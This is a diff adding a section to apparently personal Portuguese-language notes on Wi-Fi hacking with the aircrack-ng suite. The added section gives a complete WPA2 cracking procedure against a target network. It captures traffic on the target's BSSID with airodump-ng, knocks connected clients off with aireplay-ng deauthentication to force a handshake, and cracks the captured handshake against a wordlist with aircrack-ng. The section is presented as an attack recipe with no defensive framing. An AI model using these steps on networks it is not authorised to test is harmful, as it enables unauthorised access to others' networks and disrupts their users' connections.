@@ -35,5 +35,15 @@ esse comando foca em enviar dados adcionais a outros roteadores fazendo se passa
 
 - aircrack-ng -a [canal, por exemplo "1"] [nome-do-arquivo-que-vc-salvou-no-airodump-.cap]
 
+---
+### Atacando rede WPA2
 
+- airodump-ng [sua interface]
+- airodump-ng -c 1 --bssid [bssid do alvo] -w redeWPA  [sua interface wireless] -> salvando esse pacote wpa2 do alvo em um arquivo redeWPA
+- Precisa agora que haja uma nova conexão com a rede alvo para que possamos capturar o handshake (podemos utilizar o comando abaixo para remover a autenticação de dispositivos atuais na rede)
+- aireplay-ng -0 3 -e [nome da rede alvo] [sua interface wireless]
+- Agora deve ter aparecido um handshake naquele nosso comando de redeWPA e pode parar a captura agora.
+- ls -l redeWPA-01* 
+- aircrack-ng -w [wordlist] [caminho-do-arquivo-dos-pacotes-]
+- key found! [senha encontrada]
   
